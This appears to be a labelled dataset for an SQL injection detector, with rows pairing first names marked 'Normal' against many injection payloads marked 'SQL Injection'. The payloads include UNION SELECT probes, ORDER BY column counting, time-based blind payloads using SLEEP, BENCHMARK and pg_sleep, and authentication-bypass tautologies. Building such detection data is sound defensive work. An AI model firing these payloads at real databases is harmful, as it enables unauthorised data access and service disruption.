"'UNION ALL SELECT 1,2'",SQL Injection
'Fran',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
'# Numeric',SQL Injection
'Eve',Normal
'John',Normal
'Eve',Normal
'Hank',Normal
"'"""" or """"""""&""""'",SQL Injection
'Hank',Normal
'Eve',Normal
'UNION ALL SELECT 'INJ'||'ECT'||'XXX'--',SQL Injection
'1 AND (SELECT * FROM Users) = 1',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'",SQL Injection
'Grace',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#'",SQL Injection
'Bob',Normal
'Jill',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'",SQL Injection
'Hank',Normal
'Fran',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#'",SQL Injection
'OR x=y#',SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'",SQL Injection
'Alice',Normal
'ORDER BY 14#',SQL Injection
'Hank',Normal
'' GROUP BY columnnames having 1=1 --',SQL Injection
'Eve',Normal
'John',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
'ORDER BY 30',SQL Injection
"'-1 UNION SELECT 1 INTO @,@,@'",SQL Injection
'ORDER BY 4#',SQL Injection
'John',Normal
'admin' or '1'='1'/*',SQL Injection
'ORDER BY 6#',SQL Injection
'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)',SQL Injection
'Jill',Normal
'David',Normal
'Alice',Normal
'Alice',Normal
'Fran',Normal
'Alice',Normal
'or SLEEP(5)#',SQL Injection
'admin') or ('1'='1'#',SQL Injection
'Charlie',Normal
'Hank',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9'",SQL Injection
'Grace',Normal
"'admin"""") or (""""1""""=""""1""""/*'",SQL Injection
"'admin"""" or 1=1'",SQL Injection
'John',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--'",SQL Injection
'Bob',Normal
'Bob',Normal
'David',Normal
'Hank',Normal
'ORDER BY SLEEP(5)--',SQL Injection
'Eve',Normal
'Fran',Normal
'Alice',Normal
'Fran',Normal
'Alice',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--'",SQL Injection
'Bob',Normal
'Grace',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15'",SQL Injection
'Alice',Normal
'ORDER BY 11--',SQL Injection
'Charlie',Normal
'Jill',Normal
'Hank',Normal
'David',Normal
'ORDER BY 18',SQL Injection
'Charlie',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--'",SQL Injection
'John',Normal
'Alice',Normal
'Alice',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
'Fran',Normal
'Alice',Normal
'Hank',Normal
"'admin"""") or (""""1""""=""""1""""#'",SQL Injection
"'ORDER BY 1,SLEEP(5)#'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#'",SQL Injection
'Fran',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'",SQL Injection
'Charlie',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#'",SQL Injection
'Fran',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
"'admin""""/*'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'",SQL Injection
'Jill',Normal
'pg_sleep(5)--',SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--'",SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'David',Normal
'Charlie',Normal
'Eve',Normal
'Alice',Normal
'Charlie',Normal
'%2c(select%20*%20from%20(select(sleep(10)))a)',SQL Injection
'ORDER BY 28--',SQL Injection
'Charlie',Normal
'Fran',Normal
'Jill',Normal
'sleep(5)#',SQL Injection
'Charlie',Normal
'Jill',Normal
'Alice',Normal
'David',Normal
'-- -	SQL comment',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--'",SQL Injection
';,SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'",SQL Injection
'ORDER BY 16--',SQL Injection
'Bob',Normal
'Grace',Normal
'Eve',Normal
'Alice',Normal
'Hank',Normal
'Eve',Normal
'Alice',Normal
"'"""" or """""""" """"'",SQL Injection
'John',Normal
'John',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
'Grace',Normal
'Charlie',Normal
'Eve',Normal
'Fran',Normal
'Charlie',Normal
'Eve',Normal
'Bob',Normal
'Charlie',Normal
''^'',SQL Injection
'ORDER BY 3--',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'",SQL Injection
'ORDER BY 1#',SQL Injection
'Fran',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8--'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'",SQL Injection
'Eve',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13'",SQL Injection
'ORDER BY 11--',SQL Injection
'ORDER BY 22--',SQL Injection
'ORDER BY 2--',SQL Injection
'ORDER BY 30--',SQL Injection
'Jill',Normal
'Alice',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5'",SQL Injection
'Eve',Normal
'ORDER BY 12',SQL Injection
'ORDER BY 23#',SQL Injection
'Bob',Normal
'Fran',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'",SQL Injection
'Hank',Normal
'Charlie',Normal
'Charlie',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))'",SQL Injection
'Jill',Normal
'Jill',Normal
'ORDER BY 9--',SQL Injection
'ORDER BY 11',SQL Injection
'&&SLEEP(5)--',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
'Alice',Normal
'Charlie',Normal
'ORDER BY 11#',SQL Injection
'Fran',Normal
'Hank',Normal
'/*  	C-style comment',SQL Injection
'David',Normal
'David',Normal
'Jill',Normal
'||		(double pipe) concatenate',SQL Injection
'Hank',Normal
'Charlie',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#'",SQL Injection
'Fran',Normal
'Bob',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#'",SQL Injection
'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='',SQL Injection
'Alice',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17'",SQL Injection
'David',Normal
'/*  	C-style comment',SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'",SQL Injection
';,SQL Injection
'Jill',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
'Hank',Normal
'ORDER BY 29--',SQL Injection
'Jill',Normal
'John',Normal
'Hank',Normal
'Alice',Normal
'' AND EXISTS(SELECT * FROM users WHERE name = 'admin') --',SQL Injection
"'"""") or sleep(5)=""""'",SQL Injection
'ORDER BY 23',SQL Injection
'John',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5'",SQL Injection
'John',Normal
'SLEEP(5)='',SQL Injection
'Eve',Normal
'Hank',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
'David',Normal
"'"""") or true--'",SQL Injection
"'admin"""") or """"1""""=""""1""""--'",SQL Injection
'Charlie',Normal
'Charlie',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
'John',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'",SQL Injection
'Grace',Normal
'Alice',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'",SQL Injection
'Hank',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
'Eve',Normal
'Fran',Normal
'1)) or pg_sleep(5)--',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'",SQL Injection
'Hank',Normal
'Alice',Normal
'Eve',Normal
'John',Normal
''-'',SQL Injection
"'admin""""or 1=1 or """"""""=""""'",SQL Injection
'admin' --',SQL Injection
'Fran',Normal
'Jill',Normal
'Bob',Normal
'SLEEP(5)='',SQL Injection
'Fran',Normal
''&&SLEEP(5)&&'1',SQL Injection
'John',Normal
'Eve',Normal
'John',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#'",SQL Injection
"'admin"""" #'",SQL Injection
'Eve',Normal
'Charlie',Normal
'Alice',Normal
'David',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13'",SQL Injection
'' '',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
'Jill',Normal
'ORDER BY 5',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
'Grace',Normal
'Grace',Normal
"'benchmark(10000000,MD5(1))#'",SQL Injection
'ORDER BY 6',SQL Injection
'Eve',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--'",SQL Injection
"'"""") or true--'",SQL Injection
'Grace',Normal
'Eve',Normal
'Bob',Normal
'Hank',Normal
'Grace',Normal
'ORDER BY 22',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'",SQL Injection
'Jill',Normal
'' OR '1',SQL Injection
'OR 1=1--',SQL Injection
'admin' --',SQL Injection
'Hank',Normal
'ORDER BY 9',SQL Injection
'Bob',Normal
'ORDER BY 9',SQL Injection
'Fran',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--'",SQL Injection
'waitfor delay '00:00:05'',SQL Injection
'John',Normal
'Hank',Normal
'John',Normal
'Hank',Normal
'Bob',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'John',Normal
'Grace',Normal
'John',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
'' or ''-'',SQL Injection
'Fran',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--'",SQL Injection
'Hank',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'",SQL Injection
'Alice',Normal
'Grace',Normal
''&&SLEEP(5)&&'1',SQL Injection
'' AND EXISTS(SELECT * FROM users WHERE name = 'admin') --',SQL Injection
'ORDER BY 24#',SQL Injection
'David',Normal
'Charlie',Normal
'Jill',Normal
'Hank',Normal
'Bob',Normal
'Bob',Normal
'Grace',Normal
'Eve',Normal
'ORDER BY 30#',SQL Injection
'));,SQL Injection
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
'ORDER BY 19',SQL Injection
'' AnD SLEEP(5) ANd '1',SQL Injection
'John',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11'",SQL Injection
'Jill',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--'",SQL Injection
'David',Normal
'Grace',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
'Eve',Normal
'/',SQL Injection
'Alice',Normal
'Charlie',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
'Hank',Normal
'AND 1=1#',SQL Injection
'Charlie',Normal
'Grace',Normal
'Bob',Normal
'Charlie',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
"'UNION ALL SELECT 1,2,3,4#'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--'",SQL Injection
'Fran',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
'Grace',Normal
'AND 1=1--',SQL Injection
'David',Normal
'Grace',Normal
"'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16'",SQL Injection
'Grace',Normal
'ORDER BY 3--',SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16'",SQL Injection
'Hank',Normal
"'and (select substring(@@version,2,1))='i''",SQL Injection
'Hank',Normal
'Bob',Normal
'ORDER BY 23',SQL Injection
'ORDER BY 20#',SQL Injection
'Hank',Normal
'WHERE 1=1 AND 1=1',SQL Injection
'Eve',Normal
'Jill',Normal
'Charlie',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
'Grace',Normal
'John',Normal
'AND 7300=7300 AND ('pKlZ'='pKlZ',SQL Injection
'Alice',Normal
'AS INJECTX WHERE 1=1 AND 1=1',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))'",SQL Injection
'Jill',Normal
'ORDER BY 5--',SQL Injection
'Eve',Normal
'Jill',Normal
'Alice',Normal
'Jill',Normal
'Eve',Normal
'\\',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
'Alice',Normal
'Hank',Normal
'Eve',Normal
'Charlie',Normal
'Fran',Normal
'or SLEEP(5)='',SQL Injection
'AND 7300=7300 AND 'pKlZ'='pKlY',SQL Injection
'HAVING 1=0',SQL Injection
"'"""" OR """""""" = """"'",SQL Injection
'WHERE 1=1 AND 1=1',SQL Injection
"'admin"""" or 1=1/*'",SQL Injection
'ORDER BY 23--',SQL Injection
'' AnD SLEEP(5) ANd '1',SQL Injection
'Fran',Normal
');,SQL Injection
"'"""" or sleep(5)#'",SQL Injection
'Hank',Normal
"'""""&""""'",SQL Injection
'Alice',Normal
"'-1 UNION SELECT 1 INTO @,@'",SQL Injection
'Bob',Normal
'David',Normal
'David',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
'Bob',Normal
"'"""" """"'",SQL Injection
'Eve',Normal
'Grace',Normal
'Eve',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))'",SQL Injection
'Charlie',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Fran',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'ORDER BY 11--',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
'David',Normal
'Charlie',Normal
'1) or pg_sleep(5)--',SQL Injection
'Alice',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'",SQL Injection
'ORDER BY 2',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
"'admin"""") or (""""1""""=""""1""""--'",SQL Injection
'Fran',Normal
'Bob',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'",SQL Injection
'Hank',Normal
'Grace',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'",SQL Injection
'John',Normal
'Hank',Normal
'David',Normal
"'UNION ALL SELECT 1,2'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'",SQL Injection
'' AnD SLEEP(5) ANd '1',SQL Injection
'Fran',Normal
'Grace',Normal
'Bob',Normal
'UNION ALL SELECT SLEEP(5)--',SQL Injection
'Fran',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#'",SQL Injection
'Eve',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--'",SQL Injection
''*'',SQL Injection
'John',Normal
'Grace',Normal
'Eve',Normal
'David',Normal
'Jill',Normal
'Eve',Normal
'Alice',Normal
'Bob',Normal
'AS INJECTX WHERE 1=1 AND 1=1',SQL Injection
'Alice',Normal
'AND 1=1--',SQL Injection
'Grace',Normal
